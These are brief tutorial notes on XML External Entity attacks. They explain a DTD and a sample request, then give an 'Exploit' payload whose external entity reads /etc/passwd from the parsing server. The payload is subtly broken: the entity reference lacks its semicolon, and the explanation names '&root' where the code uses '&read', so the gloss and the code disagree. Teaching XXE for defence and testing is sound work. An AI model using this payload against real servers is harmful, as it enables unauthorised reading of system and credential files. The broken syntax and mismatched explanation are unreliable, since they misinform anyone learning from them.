# XML External Entity Hacking

## Document Type Definition (DTD)
Defines the structure of the document

note.dtd
```xml
<!DOCTYPE note [ 
    <!ELEMENT note (to,from,heading,body)> 
    <!ELEMENT to (#PCDATA)> 
    <!ELEMENT from (#PCDATA)> 
    <!ELEMENT heading (#PCDATA)> 
    <!ELEMENT body (#PCDATA)> 
]>
```

`!DOCTYPE note` -  Root element named note
`!ELEMENT note` - Parent element that must contain to, from, heading, body
`!ELEMENT to` - To element. Data type "#PCDATA"
`(#PCDATA)` - Parsable  data

request.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>mom</to>
    <from>me</from>
    <heading>flowers</heading>
    <body>Just kidding, XXE Attack!</body>
</note>
```

## Exploit
Instead of reading the dtd file, we will read the password file.

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY read SYSTEM 'file:///etc/passwd'>
]>
<root>&read</root>
```

`&root` - Output the result of SYSTEM 'file:///etc/passwd'
